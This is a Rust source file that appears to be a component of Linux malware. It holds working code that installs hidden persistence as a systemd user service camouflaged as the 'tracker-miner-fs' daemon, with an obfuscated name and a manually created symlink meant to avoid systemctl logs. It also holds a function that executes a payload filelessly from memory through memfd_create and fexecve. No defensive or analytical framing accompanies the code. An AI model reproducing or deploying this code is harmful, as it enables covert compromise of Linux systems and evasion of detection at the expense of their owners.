use std::fs;
use std::path::{Path, PathBuf};
use std::os::unix::io::FromRawFd;
use std::process::Command;
use std::ffi::CString;
use libc::{c_char, c_int, c_void};
use obfstr::obfstr;

// Persistence: systemd --user
pub fn install_persistence(executable_path: &Path) -> Result<(), String> {
    let home = dirs::home_dir().ok_or("No home dir")?;
    let config_dir = home.join(".config/systemd/user");
    
    if !config_dir.exists() {
        fs::create_dir_all(&config_dir).map_err(|e| e.to_string())?;
    }

    // Camouflaged Service Name
    let service_name = obfstr!("tracker-miner-fs.service");
    let service_path = config_dir.join(service_name);

    let unit_content = format!(
        "[Unit]\n\
         Description=Tracker File System Mining Daemon\n\
         Documentation=man:tracker-miner-fs(1)\n\
         \n\
         [Service]\n\
         ExecStart={}\n\
         Restart=always\n\
         RestartSec=300\n\
         \n\
         [Install]\n\
         WantedBy=default.target",
        executable_path.to_string_lossy()
    );
  fs::write(&service_path, unit_content).map_err(|e| e.to_string())?;

    // Manual Symlink to avoid systemctl logs
    let wants_dir = config_dir.join("default.target.wants");
    if !wants_dir.exists() {
        fs::create_dir_all(&wants_dir).map_err(|e| e.to_string())?;
    }
    
    let symlink_path = wants_dir.join(service_name);
    if !symlink_path.exists() {
        std::os::unix::fs::symlink(&service_path, &symlink_path).map_err(|e| e.to_string())?;
    }

    Ok(())
}

// Reflective Loading via MemFD
pub fn memfd_exec(name: &str, data: &[u8], args: &[String]) -> Result<(), String> {
    unsafe {
        let name_c = CString::new(name).unwrap();
        
        // 1. memfd_create
        let fd = libc::memfd_create(name_c.as_ptr(), libc::MFD_CLOEXEC);
        if fd < 0 {
            return Err("memfd_create failed".to_string());
        }

        // 2. Write data
        let mut written = 0;
        while written < data.len() {
            let count = libc::write(
                fd, 
                data[written..].as_ptr() as *const c_void, 
                data.len() - written
            );
            if count < 0 {
                libc::close(fd);
                return Err("write failed".to_string());
            }
            written += count as usize;
        }

        // 3. Prepare args
        let mut argv_c: Vec<CString> = Vec::new();
        argv_c.push(name_c.clone());
        for arg in args {
            argv_c.push(CString::new(arg.as_str()).unwrap());
        }
        let mut argv_ptrs: Vec<*const c_char> = argv_c.iter().map(|s| s.as_ptr()).collect();
        argv_ptrs.push(std::ptr::null());

        let mut envp_ptrs: Vec<*const c_char> = Vec::new();
        for (key, value) in std::env::vars() {
            let s = CString::new(format!("{}={}", key, value)).unwrap();
            envp_ptrs.push(s.into_raw()); 
        }
        envp_ptrs.push(std::ptr::null());

        // 4. fexecve
        let ret = libc::fexecve(fd, argv_ptrs.as_ptr(), envp_ptrs.as_ptr());
        
        libc::close(fd);
        Err(format!("fexecve failed: {}", ret))
    }
}
